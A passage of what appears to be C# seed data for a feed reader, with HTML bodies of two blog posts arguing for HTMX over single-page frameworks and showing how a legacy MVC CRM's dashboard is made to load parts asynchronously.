control so we reacted. New build tools, new compiler optimization techniques… even more complexity.</p> <p>Operating in a reactive space rarely gives time for forethought or planning. There were many unintended consequences (routing, deep linking, state management, server-side rendering, SEO, accessibility, code bloat, dependency management…) along the way that, again, we had to react to.</p> <p>We are where we are in web development today because the previous generation of tools weren’t cutting it. Yet, as powerful and useful as these frameworks have proven to be, perhaps they are overkill in many cases.</p> <p>But what’s the alternative? Many would argue the options are either modern frameworks or going back to those vanilla Web 1.0 days of full page refreshes on every action. I guess it works ok for my minimalist, static html, anachronistic blog but it’s certainly not an option for the SaaS CRM I run.</p> <p>Fortunately, there exists a third way, a “middle path” if you will. A return to power and simplicity of hypermedia systems but designed to meet 21st century UX expectations.</p> <h2 id=\"htmx---the-third-way\">HTMX - The “Third Way”</h2> <p>The third way I present is <a href=\"https://htmx.org/\">HTMX</a>, “the newest old way to make web apps.” While mainstream js frameworks have taken the approach of building complex application runtimes that run in a browser, reducing HTML from <em>hypertext</em> markup language to mere <em>user-interface markup language</em>, HTMX takes a refreshingly different hypermedia-first approach by extending HTML to align with the UX demands of modern web apps while avoiding the bloat, complexity, and ephemerality in the process.</p> <p>My all-time favorite nerdcore rapper, <a href=\"https://www.youtube.com/@stdout\">stdout</a>, wrote a fabulous track called “hell.js” that covers first the ecstasy then the agony of modern js frameworks and their complexity ending with the somber line “don’t tell anybody but man I miss jQuery… man I miss jQuery.”</p> <div class=\"youtube-wrapper\"> <iframe src=\"https://www.youtube.com/embed/Yx6k6WR8GRs\" allowfullscreen=\"\"></iframe> </div> <p>The cynic might be amused that the antidote to “hell.js” that I’m promoting here is… a JavaScript library; but the approach the authors took is materially different and more true to the ideas and architecture of the web than anything I’ve seen before. How is it different? Recall that Roy Fielding defined the REST architectural style–the architecture of the web–by six constraints. The sixth is the optional “Code on Demand” constraint.</p> <blockquote> <p>“…a client component has access to a set of resources, but not the know-how on how to process them. It sends a request to a remote server for the code representing that know-how, receives that code, and executes it locally. The advantages of code-on-demand include the ability to add features to a deployed client, which provides for improved extensibility and configurability, and better user-perceived performance and efficiency when the code can adapt its actions to the client’s environment and interact with the user locally rather than through remote interactions”</p> <p>Dr. Roy Fielding - Architectural Styles and the Design of Network-Based Architectures</p> </blockquote> <p>Long ago we learned that the hypermedia HTML, as currently specified, is insufficient for our modern application needs. In this case, the client requests the code (a 14kb gzipped lib with zero dependencies) that can extend the client’s capabilities (and improve user-perceived performance and efficiency). This is how the web was <em>supposed</em> to work! How is this different from react or any of the other mainstream frameworks? Aren’t they, too, just taking advantage of the code-on-demand constraint? Well, yes but in the process they violate the Uniform Interface constraint. Hypermedia is no longer the engine of application state, it’s an implementation detail stripping away everything hypermedia gave us. It’s UIML, not HTML; different in every respect except syntax.</p> <p>So we’re violating a constraint, so what? Virtually every system ever created described as RESTful violates one or more of these defining constraints. It’s not about passing some arbitrary purity test, it’s about keeping everything the web already gives us while adding only essential complexity to meet the bar of modern application UX.</p> <p>Consider that each constraint is chosen to elicit certain system qualities (capabilities, -illities, non-functional quality attributes… whatever you want to call them), violating constraints inevitably degrades or eliminates system qualities. This is fine if those -illities aren’t important but, as the timeline presented above shows, they are almost always important. More code had to be added to fix what got broken as a result of violating that constraint, leading to an increasing amount of complexity and hell.js. In other words, Half of the complexity was figuring out how to best create the dynamic UX of the modern web, and the other half was dealing with the accidental complexity our chosen approach introduced. Beyond what more code (and more dependencies, and more tools, and more moving parts) has been able to patch, one key aspect of the web remains broken; it’s evolvability. JS framework code is going to break orders of magnitude more frequently than HTML (or even extended html) due to a lack of stable abstractions.</p> <h3 id=\"what-about-htmx-breaking-changes\">What about HTMX breaking changes?</h3> <p>I’m glad you asked! It’s not an issue.</p> <p>HTMX is declarative, not imperative. HTMX is predicated on the core philosophy of “what if HTML natively included a set of features that better aligned with modern UX needs?” Rather than building yet another js library or framework that you code with, the HTMX simply introduces a set of meticulously planned and well-though-out set of extensions to HTML.</p> <p>You don’t code with or against it directly, you simply write HTML. HTMX adds new properties to html elements that the browser engine knows how to process by virtue of code on demand. The entire library could be easily rewritten (it’s only 3500 lines) without breaking a single client since all it does is finds and processes the tag attributes as declared rather than requiring direct coupling to the implementation of a framework. Also notably, HTMX implements a zero-clause BSD license to all-but-eliminates the risk of a the library becoming abandonware.</p> <p>I am currently running V1.9.10 extensively in production however 2.0 is on the horizon. Normally a major version release in the webdev world indicates a major breaking change. I have looked through the <a href=\"https://v2-0v2-0.htmx.org/migration-guide-htmx-1/\">v1.x-v2.x upgrade guide</a> and even 1.x - 2.x requires zero changes for almost everyone except for plugin developers and a small set of folks who implemented a niche feature on the 0.x version and did not upgrade when v1.0 was released. Basically this nonsense is a thing of the past:</p> <div class=\"youtube-wrapper\"> <iframe src=\"https://www.youtube.com/embed/MLxGtH4XQTU\" allowfullscreen=\"\"></iframe> </div> <p>Tune in for <a href=\"/post/third-way-web-development-part-ii\">part II</a> where we will see HTMX in action in the context of a real-world, production application. I promise you this: it will not be a panacea. Remember, everything is a trade off. There are no best practices, just what’s best in the context of whatever you’re building next.</p>",
                            Description = "When I look back on my career in technology, I’ve been seduced, over and over again, by this idea that best practices exist and that I can consider my work “good” so long as I follow those best practices. In some ways it would be wonderful to work in a field where there are absolute “right” and “wrong” answers but I no longer believe software engineering is one of those fields. Every single decision we make has consequences and whether these consequences are positive, negative, or mixed will depend on the context. It’s all just a set of trade-offs, and the key to making good decisions lies in understanding what matters most and evaluating the trade-offs in this context. There are no best practices, only trade-offs. -First law of Software Architecture We’ve somehow gotten into this weird place in web development where the consensus seems to be that an absolute set of best practices exist; where the only meaningful decisions surround which framework to use and how to find the optimal implementation details within that chosen framework. Unfortunately the web development space has become so myopically focused on frameworks, tooling, and Single-Page Applications (SPAs) as the de-facto “best practices” that the trade-offs of these approaches are rarely discussed–or even well-understood up front–and, in many cases, the result is an ocean of bloat and accidental complexity that often could have been avoided entirely.",
                            FeedId = 1,
                            ImageUrl = "https://sufficiently-advanced.technology/assets/images/htmx-meme.png",
                            IsDeleted = false,
                            IsFavorite = false,
                            IsRead = false,
                            LastUpdated = new DateTime(2024, 1, 23, 17, 0, 0, 0, DateTimeKind.Local),
                            PublishDateTime = new DateTime(2024, 1, 23, 17, 0, 0, 0, DateTimeKind.Local),
                            Title = "Third-Way Web Development Part I - History",
                            Uri = "https://sufficiently-advanced.technology/post/third-way-web-development-part-i"
                        },
                        new
                        {
                            Id = 3,
                            Author = "Michael",
                            Body = "<figure class=\"aligncenter\"> <img property=\"image\" src=\"https://sufficiently-advanced.technology/assets/images/htmx-meme.png\" width=\"800\" height=\"300\" alt=\"a timeline of the simplicity of web development in 2014, the complexity in 2019, and HTMX introducing a new simplicity in 2021\" /> </figure> <p>This post picks up from <a href=\"/post/third-way-web-development-part-i\">part I</a> which broadly tells the story of where we are currently and how we got here; ultimately introducing <a href=\"https://htmx.org\">HTMX</a> as the “third way.” It serves as the background and context for this post. If you haven’t already read it, <a href=\"/post/third-way-web-development-part-i\">go ahead…</a> I’ll wait.</p> <p>Now that the background is out of the way, let’s look in depth at HTMX. Rather than the usual quickstart or toy examples, we’ll be looking at this in the context of a real production application already in the wild. We’ll modernize a legacy MVC application, examining the UX without and then with HTMX.</p> <!--more--> <h2 id=\"modernizing-mago\">Modernizing Mago</h2> <p>Mago is a SaaS CRM built for professional entertainers. Although it’s life began over a decade ago, it boasts a modern and powerful set of features that many professional entertainers depend on to run their business. It is largely architected as a <a href=\"/post/modular-monolith-part-i\">Modular Monolith</a> implementing the MVC pattern. This architecture provides a balance between simplicity and agility with a clear path to easily decompose into a distributed architecture should changing demands require. On the client-side is some jQuery (which was the style at the time).</p> <p><img src=\"/assets/images/jquery-on-my-belt.jpg\" alt=\"Grandpa Simpson Meme - I had a jQuery on my belt, which was the style at the time\" /></p> <p>For an MVC app, it is reasonably optimized. The backend framework already supports bundling and minification of resources. The dashboard has a raw page weight of 11kb (gzipped).Although this the app uses several UI plugins, they are loaded at runtime in a single minified bundle. The core js weighs in at 369.8kb (gzipped) and the core CSS is 181kb (gzipped). Static resources are available through a CDN fronting the server cluster and a sensible cache policy is already defined (the most efficient network request is the one that doesn’t happen at all). Un-cached, the dashboard total page weight is currently 1.4mb (gzipped) and cached that page weight is 43.2kb(gzipped).</p> <p>Mago is a good candidate for the hypermedia/htmx model of web app development. Having a single source of truth with respect to state (the server) is more than adequate; duplicating state locally (by way of a state management library like redux or vuex) adds very little benefit given the UX challenges that HTMX address, and greatly simplifies development and maintenance. Client-side code execution is typical of a relatively simple CRUD web-app; UI libraries are used, of course, but there is no need for massive amounts of complex client-side code that a mainstream js framework would organize and optimize. Modernizing this app with HTMX will result in a much lower time-to-value for my customers and, since I’m the sole (part-time) developer/maintainer, this approach keeps maintenance simple and manageable over the life of the product. The trade-offs make sense.</p> <p>The goal is to achieve that dynamic and responsive user experience that we’ve come to love and expect, without a massive rewrite and the complexity and inevitable tech debt that comes with mainstream js frameworks. jQuery is currently powering asynchronous loading of some elements but implementation is uneven. Some operations will reload individual components and others trigger new navigation or a full-page refresh. Either way, imperatively manipulating the DOM with an ajax library is messy and verbose; HTMX will eliminate that by extending HTML to offer this behavior natively.</p> <h2 id=\"performance-and-ux\">Performance and UX</h2> <p>Upon logging in, the performer is presented with a dashboard.</p> <p><img src=\"/assets/images/dashboard.jpg\" alt=\"The Mago Dashboard\" /></p> <p>Almost all html resources are actually composite resources. At a minimum, the browser is building a composite of the HTML, CSS rules, and scripts. In addition to those typical embedded resources, we can think of each dashlet on this dashboard as an embedded resource. Mainstream js frameworks adopt the component model, where a page (typically considered a page-level component, or view depending on your conventions) is composed of many components. The components themselves are composed of even more components. This approach maximizes modularity, structure, and reusability. This is a useful approach to modularity on the web and, fortunately, it is very compatible with most MVC frameworks. My backend framework already supports the concept of “views” and “partials” and this application already follows this modular approach without any refactoring prerequisites.</p> <p>Friend and fellow speaker, <a href=\"https://thirstyhead.com/\">Scott Davis</a>, has produced many creative and insightful talks including <a href=\"https://thirstyhead.com/the-wrong-kind-of-fast/\">“The Wrong Kind of Fast”</a> where he argues for evidence-based architecture and questions the conventional wisdom that mainstream frameworks are truly fast (as well as whether they offer <em>the right kind of fast</em>). The image below is from his slide deck.</p> <p><img src=\"/assets/images/loading-journey.png\" alt=\"Loading is a journey - timeline from initial request to time-to-interactive and fully-loaded\" /></p> <p>No matter how we build a web app today, we need to consider both user-perceived performance (first meaningful paint) and total wall-clock performance (time to interactive).</p> <p>If we begin with a Web 1.0 model (pure HTML/js - no HTMX, no ajax) of the Mago dashboard, this entire page would be composed on the server side before being delivered to the client.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"row\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"col-xs-12 col-sm-7\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;h1</span> <span class=\"na\">class=</span><span class=\"s\">\"page-title txt-color-blueDark\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa-fw fa fa-home\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> Dashboard <span class=\"nt\">&lt;span&gt;</span>&gt; My Dashboard<span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/h1&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> @{ Html.RenderAction(\"FinancialSummary\", \"Home\"); } <span class=\"nt\">&lt;/div&gt;</span> ... </code></pre></div></div> <p>A number of external calls to the database (and other services) are necessary to compose this page. On my dev machine, the total time necessary to build this page is several seconds. Time to first paint is very high; unacceptably high by today’s standards. However, the time from first paint to interactive is just 266 milliseconds.</p> <table> <thead> <tr> <th>Action</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>Parse HTML</td> <td>11ms</td> </tr> <tr> <td>Parse Scripts</td> <td>217ms</td> </tr> <tr> <td>Render</td> <td>38 ms</td> </tr> <tr> <td>Paint</td> <td>4ms</td> </tr> </tbody> </table> <p>This rapid time-to-interactive is a small comfort to the user. The user experience is… not great.</p> <p>The framework approach is to deliver <em>something</em> very rapidly. On the very first load, a bare skeleton that contains a minimal layout and a loading indicator while the main bundle is downloaded and executed. Depending on the bundle size (see examples illustrated below) this will largely depend on the user’s connection speed.</p> <p><img src=\"/assets/images/uncompressed-js.png\" alt=\"Uncompressed JS - what do popular sites send down - 4-7.2MB\" /></p> <p>At this point, the bundle is parsed and executed and the first contentful paint appears. Additional “Loading” placeholders are placed where the content will ultimately be displayed. Meanwhile, in the background, one or more API calls are made to fetch the data. However long the underlying database queries take will ultimately determine the latency here. Notably this bottleneck introduces substantially identical latency as the queries in Web 1.0 Mago. While this approach <em>feels</em> faster, it is similar–if not slower–in total time to interactive when compared to Web 1.0 Mago. Yet the user experience is significantly better.</p> <p>However, on a second run, the framework will likely leave Mago in the dust. The bundle is already loaded, the code is already compiled and executing, and the data may already be cached locally. The user experience is <em>excellent!</em> Can HTMX compete with this?</p> <h2 id=\"incremental-improvements\">Incremental Improvements</h2> <p>HTMX asserts that modern web apps demand more hypermedia controls than just anchor and form tags. HTMX also asserts that web apps demand more surgical precision of what is loaded and when. Within a given app, we should be able to load and parse core content only once (as the framework approach enables). The first HTMX property we will introduce is <code class=\"language-plaintext highlighter-rouge\">hx-boost</code>.</p> <h3 id=\"hx-boost\">HX-Boost</h3> <p>Typically we optimize the loading lifecycle by moving external scripts to the end of the page (or use async/defer properties on script tags). Typically the browser will begin to parse the HTML but pause when it reaches a script tag to load that script before continuing. We can get to first meaningful paint quickly by loading the scripts last. For this example I’m going to buck convention move my scripts to the <code class=\"language-plaintext highlighter-rouge\">&lt;head&gt;</code> tag for reasons I’ll explain shortly. In the process, I’m going to include the HTMX library in my page. It can be referenced via CDN:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"https://unpkg.com/htmx.org@1.9.10\"</span> <span class=\"na\">integrity=</span><span class=\"s\">\"sha384-D1Kt99CQMDuVetoL1lrYwg5t+9QdHe7NLX/SoJYkXDFfX37iInKRy5xLSi8nO7UC\"</span> <span class=\"na\">crossorigin=</span><span class=\"s\">\"anonymous\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span> </code></pre></div></div> <p>But for <a href=\"https://blog.wesleyac.com/posts/why-not-javascript-cdn\">reasons</a> I’m going to be hosting this directly in my application.</p> <p>My goal is here is to perform a single application bootstrap, similar to the framework approach. Since the content of the <code class=\"language-plaintext highlighter-rouge\">&lt;head&gt;</code> tag is common across my application, I don’t want to load/parse CSS and global JavaScript on every navigation. I can accomplish this easily using the <code class=\"language-plaintext highlighter-rouge\">hx-boost</code> property like so.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">\"main\"</span> <span class=\"na\">role=</span><span class=\"s\">\"main\"</span> <span class=\"na\">hx-boost=</span><span class=\"s\">\"true\"</span><span class=\"nt\">&gt;</span> ... </code></pre></div></div> <p>Adding the <code class=\"language-plaintext highlighter-rouge\">hx-boost</code> property to a tag will “boost” all child anchors and form tags to use ajax. This is a form of progressive enhancement that degrades gracefully if JavaScript is not enabled (they’re still normal anchors or forms). What happens under the hood?</p> <ol> <li>The user clicks a local hyperlink</li> <li>HTMX intercepts the request and performs an ajax <code class=\"language-plaintext highlighter-rouge\">GET</code> of the requested resource</li> <li>HTMX takes the response and parses out the <code class=\"language-plaintext highlighter-rouge\">body</code> tag and the <code class=\"language-plaintext highlighter-rouge\">title</code> tag.</li> <li>HTMX replaces the <code class=\"language-plaintext highlighter-rouge\">innerHTML</code> of the body with the response, updates the <code class=\"language-plaintext highlighter-rouge\">title</code> appropriately</li> <li>HTMX pushes the full url into the browser history</li> </ol> <p>Of course, there are a number of “smarts” embedded in this approach. A request that should only update part of the page won’t be boosted, external links aren’t boosted, and, of course, this behavior can be selectively enabled or overridden at the form or link level with the properties <code class=\"language-plaintext highlighter-rouge\">hx-boost=\"true\"</code> and <code class=\"language-plaintext highlighter-rouge\">hx-boost=\"false\"</code> respectively.</p> <p>This one-liner saves a couple-hundred milliseconds on each request, reducing time to first paint when navigating the application.</p> <p>You can see a request was boosted from the devtools:</p> <p><img src=\"/assets/images/boosted-request.png\" alt=\"Chrome devtools, showing a request was intercepted by htmx\" /></p> <p>Additionally HTMX will include a number of request headers including <code class=\"language-plaintext highlighter-rouge\">Hx-Boosted: true</code> should you need to know a request was boosted on the server side.</p> <h2 id=\"improving-ux-by-reducing-time-to-first-paint\">Improving UX by Reducing Time-To-First-Paint</h2> <p>We’re going to borrow another trick from the framework playbook by separating data retrieval from the first paint, asynchronously loading content. The magic of the modern UX that began in 2004 continues to be driven by asynchronous interactions. Let’s look at the first data-driven component on the page; the income and pipeline chart.</p> <p>Currently we’re populating that on the server-side at template render-time.</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"row\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"col-xs-12 col-sm-7\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;h1</span> <span class=\"na\">class=</span><span class=\"s\">\"page-title txt-color-blueDark\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa-fw fa fa-home\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> Dashboard <span class=\"nt\">&lt;span&gt;</span>&gt; My Dashboard<span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/h1&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> @{ Html.RenderAction(\"FinancialSummary\", \"Home\"); } <span class=\"nt\">&lt;/div&gt;</span> ... </code></pre></div></div> <p>On my dev machine, with a remote dev database, that operation takes 1.3 seconds. That’s a significant amount of time where the performer is waiting for <em>anything</em> to happen on their screen. The user-perceived performance will be much higher if this happens asynchronously. It should be noted that this approach breaks the idea of progressive enhancement. If JavaScript is disabled, the user won’t ever see real content (of course, this is also true of any mainstream framework). Keep this consideration in mind if graceful degradation is important to your app. Although mainstream frameworks don’t offer any kind of graceful fallback, it would be trivial to leverage the request headers and optionally perform the appropriate server-side rendering if the <code class=\"language-plaintext highlighter-rouge\">Hx-Request</code> or <code class=\"language-plaintext highlighter-rouge\">Hx-Boosted</code> headers aren’t present.</p> <p>For now, let’s replace the <code class=\"language-plaintext highlighter-rouge\">RenderAction()</code> with placeholder html:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">\"FinancialSummary\"</span> <span class=\"na\">class=</span><span class=\"s\">\"col-xs-12 col-sm-5\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;ul</span> <span class=\"na\">id=</span><span class=\"s\">\"sparks\"</span> <span class=\"na\">class=</span><span class=\"s\">\"\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;li</span> <span class=\"na\">class=</span><span class=\"s\">\"sparks-info\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;h5&gt;</span> Booked Income <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"txt-color-blue\"</span><span class=\"nt\">&gt;</span>$Loading...<span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/h5&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"sparkline txt-color-blue hidden-sm\"</span><span class=\"nt\">&gt;</span> 100,100,100,100,100,100,100,100,100,100,100,100 <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/li&gt;</span> <span class=\"nt\">&lt;li</span> <span class=\"na\">class=</span><span class=\"s\">\"sparks-info\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;h5&gt;</span> Total Pipeline <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"txt-color-greenDark\"</span><span class=\"nt\">&gt;</span>$Loading...<span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/h5&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"sparkline txt-color-greenDark hidden-sm\"</span><span class=\"nt\">&gt;</span> 100,100,100,100,100,100,100,100,100,100,100,100 <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/li&gt;</span> <span class=\"nt\">&lt;/ul&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> </code></pre></div></div> <p>We have now have a meaningful paint without delay, but we want to request the real resource when the page loads. HTMX allows you to turn any element into a hypermedia control by adding properties to the element. Let’s turn the containing div into a hypermedia control with a hypertext reference of <code class=\"language-plaintext highlighter-rouge\">/home/financialsummary</code>. We want this hypermedia control to be to be triggered when it loads, and the response targeted to replace just the contents of the div.</p> <p>First we add the <code class=\"language-plaintext highlighter-rouge\">hx-get</code> property to the container div to indicate this element makes a GET request to the given URL. By default HTMX triggers requests based on the <code class=\"language-plaintext highlighter-rouge\">click</code> event with some exceptions. By default, <code class=\"language-plaintext highlighter-rouge\">input</code>, <code class=\"language-plaintext highlighter-rouge\">textarea</code> and <code class=\"language-plaintext highlighter-rouge\">select</code> elements trigger on <code class=\"language-plaintext highlighter-rouge\">change</code> and <code class=\"language-plaintext highlighter-rouge\">form</code> elements trigger on the <code class=\"language-plaintext highlighter-rouge\">submit</code> event. There are a number of other triggers we can define, including <code class=\"language-plaintext highlighter-rouge\">load</code>. Finally we want the response to be put directly into the div that triggered it but this is the default behavior unless it is overridden.</p> <p>Our new placeholder code looks like this:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">\"FinancialSummary\"</span> <span class=\"na\">class=</span><span class=\"s\">\"col-xs-12 col-sm-5\"</span> <span class=\"na\">hx-get=</span><span class=\"s\">\"/Home/FinancialSummary\"</span> <span class=\"na\">hx-trigger=</span><span class=\"s\">\"load\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;ul</span> <span class=\"na\">id=</span><span class=\"s\">\"sparks\"</span> <span class=\"na\">class=</span><span class=\"s\">\"\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;li</span> <span class=\"na\">class=</span><span class=\"s\">\"sparks-info\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;h5&gt;</span> Booked Income <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"txt-color-blue\"</span><span class=\"nt\">&gt;</span>$Loading...<span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/h5&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"sparkline txt-color-blue hidden-mobile\"</span><span class=\"nt\">&gt;</span> 100,100,100,100,100,100,100,100,100,100,100,100 <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/li&gt;</span> <span class=\"nt\">&lt;li</span> <span class=\"na\">class=</span><span class=\"s\">\"sparks-info\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;h5&gt;</span> Total Pipeline <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"txt-color-greenDark\"</span><span class=\"nt\">&gt;</span>$Loading...<span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/h5&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"sparkline txt-color-greenDark hidden-mobile hidden-md hidden-sm\"</span><span class=\"nt\">&gt;</span> 100,100,100,100,100,100,100,100,100,100,100,100 <span class=\"nt\">&lt;/div&gt;</span> <span class=\"nt\">&lt;/li&gt;</span> <span class=\"nt\">&lt;/ul&gt;</span> <span class=\"nt\">&lt;/div&gt;</span> </code></pre></div></div> <p>The <code class=\"language-plaintext highlighter-rouge\">load</code> event fires once the DOM content is loaded, triggering an asynchronous <code class=\"language-plaintext highlighter-rouge\">GET</code> request to retrieve the FinancialSummary resource, loading it directly into the div <code class=\"language-plaintext highlighter-rouge\">#FinancialSummary</code>. Async partial loading and a better user experience achieved while writing precisely 0 lines of custom JavaScript. This is just a capability baked into HTML now.</p> <p>Additionally, we get everything induced by the architecture of the web. Recall this architecture has a cache constraint; now that FinancialSummary is a standalone resource that can be requested independently, we can apply a caching policy. Particularly since this info doesn’t change very often. Since this financial summary is displayed all over the app this will massively improve performance across the application. These two changes improve time to first meaningful paint by 1.5s across the entire application.</p> <p>We can repeat this approach for every dashlet on the dashboard so all dynamic content is loaded asynchronously.</p> <h2 id=\"lazy-loading-and-loading-indicators\">Lazy Loading and Loading Indicators</h2> <p>The notifications panel, the task list, and the Upcoming Automation dashlet all typically load “below the fold” on desktop (and everything but the calendar appears below the fold on mobile). HTMX allows us to lazy load components/embedded resources and this is what we want to do for any potentially off-screen elements. In this case we will include our content skeleton in the dashboard page resource, adding the <code class=\"language-plaintext highlighter-rouge\">hx-get</code> property, but our <code class=\"language-plaintext highlighter-rouge\">hx-trigger</code> will be (or, at least, include) <code class=\"language-plaintext highlighter-rouge\">revealed</code>.</p> <p>For the FinancialSummary, we made the containing <code class=\"language-plaintext highlighter-rouge\">div</code> the hypermedia control that responded not to a user interaction but a page event. Let’s look a slightly different approach applied the Upcoming leads dashlet.</p> <p>Like the summary, we want a rapid time-to-meaningful-paint so we will continue the pattern of putting placeholder content in the dashboard skeleton that will be asynchronously hydrated. Remember, if progressive enhancement (and graceful degradation) is important, you may want to optionally include page content if <a href=\"https://htmx.org/reference/#request_headers\">HTMX Headers</a> are not present in the request. Alternatively, I will be describing partial swaps later in this post.</p> <p>I’ve defined a “loading” class to apply to the loading dashlet for the initial loading state:</p> <div class=\"language-css highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nc\">.widget-body-htmx-loading</span><span class=\"nd\">::before</span> <span class=\"p\">{</span> <span class=\"nl\">content</span><span class=\"p\">:</span> <span class=\"sx\">url(/content/img/ajax-loader.gif)</span><span class=\"p\">;</span> <span class=\"nl\">text-align</span><span class=\"p\">:</span> <span class=\"nb\">center</span><span class=\"p\">;</span> <span class=\"nl\">font-weight</span><span class=\"p\">:</span> <span class=\"m\">700</span><span class=\"p\">;</span> <span class=\"nl\">font-size</span><span class=\"p\">:</span> <span class=\"m\">16px</span><span class=\"p\">;</span> <span class=\"nl\">color</span><span class=\"p\">:</span> <span class=\"m\">#fff</span><span class=\"p\">;</span> <span class=\"nl\">display</span><span class=\"p\">:</span> <span class=\"nb\">block</span><span class=\"p\">;</span> <span class=\"nl\">background</span><span class=\"p\">:</span> <span class=\"n\">rgba</span><span class=\"p\">(</span><span class=\"m\">255</span><span class=\"p\">,</span><span class=\"m\">255</span><span class=\"p\">,</span><span class=\"m\">255</span><span class=\"p\">,</span><span class=\"m\">.4</span><span class=\"p\">);</span> <span class=\"nl\">height</span><span class=\"p\">:</span> <span class=\"m\">100%</span><span class=\"p\">;</span> <span class=\"nl\">z-index</span><span class=\"p\">:</span> <span class=\"m\">1</span><span class=\"p\">;</span> <span class=\"nl\">width</span><span class=\"p\">:</span> <span class=\"m\">100%</span><span class=\"p\">;</span> <span class=\"nl\">position</span><span class=\"p\">:</span> <span class=\"nb\">absolute</span> <span class=\"p\">}</span> <span class=\"nc\">.widget-body-htmx-loading</span><span class=\"nd\">:hover</span> <span class=\"p\">{</span> <span class=\"nl\">cursor</span><span class=\"p\">:</span> <span class=\"nb\">wait</span> <span class=\"cp\">!important</span> <span class=\"p\">}</span> </code></pre></div></div> <p>My Skeleton looks like this:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"widget no-padding widget-color-green\"</span> <span class=\"na\">id=</span><span class=\"s\">\"ActiveLeadsWidget\"</span> <span class=\"na\">role=</span><span class=\"s\">\"widget\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;header</span> <span class=\"na\">role=</span><span class=\"s\">\"heading\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"widget-icon\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-leaf\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;h2&gt;</span>Active Leads<span class=\"nt\">&lt;/h2&gt;</span> <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">\"widget-toolbar\"</span> <span class=\"na\">role=</span><span class=\"s\">\"menu\"</span><span class=\"nt\">&gt;&lt;/div&gt;</span> <span class=\"nt\">&lt;span</span> <span class=\"na\">class=</span><span class=\"s\">\"widget-loader htmx-indicator\"</span> <span class=\"na\">id=</span><span class=\"s\">\"GigsLoading\"</span><span class=\"nt\">&gt;</span> <span class=\"nt\">&lt;i</span> <span class=\"na\">class=</span><span class=\"s\">\"fa fa-refresh fa-spin\"</span><span class=\"nt\">&gt;&lt;/i&gt;</span> <span class=\"nt\">&lt;/span&gt;</span> <span class=\"nt\">&lt;/header&gt;</span> <span class=\"nt\">&lt;div</span> <span 